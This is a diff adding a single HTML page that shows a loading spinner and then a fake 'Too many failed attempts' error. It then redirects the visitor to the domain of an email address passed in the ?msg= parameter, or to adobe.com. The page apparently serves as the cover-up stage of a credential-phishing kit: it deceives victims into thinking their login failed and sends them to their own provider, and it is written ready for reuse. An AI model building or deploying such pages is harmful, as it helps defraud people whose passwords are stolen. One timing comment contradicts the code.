@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
+    <link rel="icon" type="image/x-icon" href="https://cdn.glitch.global/d27d99eb-d54f-474f-a1fc-a598e61e5947/favicon.png?v=1724752849466">
+    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    
+    <style>
+        body {
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #f2f2f2;
+            font-family: Arial, sans-serif;
+        }
+
+        .loading {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-size: 24px;
+            color: #333;
+        }
+
+        .error-page {
+            display: none;
+            text-align: center;
+        }
+
+        .error-page img {
+            width: 100px;
+            margin-bottom: 20px;
+            filter: hue-rotate(0deg) saturate(1000%) brightness(70%) invert(17%) sepia(99%) saturate(7498%) hue-rotate(0deg) brightness(92%) contrast(132%);
+        }
+
+        .error-page h1 {
+            font-size: 24px;
+            color: #333;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Loading Screen -->
+    <div class="loading">
+        <div>
+            <div class="spinner"></div>
+            <p>Loading...</p>
+        </div>
+    </div>
+
+    <!-- Error Page -->
+    <div class="error-page">
+        <img src="https://img.icons8.com/ios-filled/100/000000/error.png" alt="Error Icon">
+        <h1>Oops! Too many failed attempts. Please try again later.</h1>
+    </div>
+
+    <script>
+        // Display loading screen for 2 seconds
+        setTimeout(() => {
+            document.querySelector('.loading').style.display = 'none';
+            document.querySelector('.error-page').style.display = 'block';
+
+            // Show error page for 5 seconds before attempting redirection
+            setTimeout(() => {
+                redirectToEmailDomain();
+            }, 5000); // 5000 milliseconds = 5 seconds
+
+        }, 2000); // 2000 milliseconds = 2 seconds
+
+        // Function to extract the domain from the email and redirect
+        function redirectToEmailDomain() {
+            // Get the query parameters from the URL
+            const urlParams = new URLSearchParams(window.location.search);
+            
+            // Get the email parameter from ?msg=
+            const email = urlParams.get("msg");
+            
+            if (email) {
+                // Extract the domain part of the email (after the '@' symbol)
+                const domain = email.split('@')[1];
+                if (domain) {
+                    // Redirect to the extracted domain URL
+                    window.location.href = `https://${domain}`;
+                    return; // Exit the function after successful redirect
+                }
+            }
+
+            // Fallback redirect after 10 seconds if no redirect has occurred
+            setTimeout(function() {
+                window.location.href = "https://www.adobe.com/"; // Change to your fallback URL
+            }, 5000); // 10000 milliseconds = 10 seconds
+        }
+    </script>
+
+</body>
+</html>
